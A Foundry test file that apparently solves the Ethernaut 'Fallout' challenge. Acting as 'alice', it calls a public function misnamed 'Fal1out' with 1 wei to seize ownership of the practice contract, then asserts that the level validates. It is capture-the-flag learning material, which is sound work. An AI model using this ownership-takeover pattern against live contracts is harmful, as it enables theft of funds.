// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout/Fallout.sol";
import {FalloutFactory} from "../src/Fallout/FalloutFactory.sol";

contract FalloutTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testFallout() public {
        FalloutFactory factory = new FalloutFactory();
        assertEq(factory.owner(), address(this));
        address instance = factory.createInstance(_alice); // _alice is nothing to do with this
        Fallout f = Fallout(payable(instance));
        assertEq(f.owner(), address(0)); // init is null address
        vm.startPrank(_alice);
        f.Fal1out{value: 1 wei}();
        assertTrue(
            factory.validateInstance(payable(instance), _alice),
            "invalid"
        );
    }
}
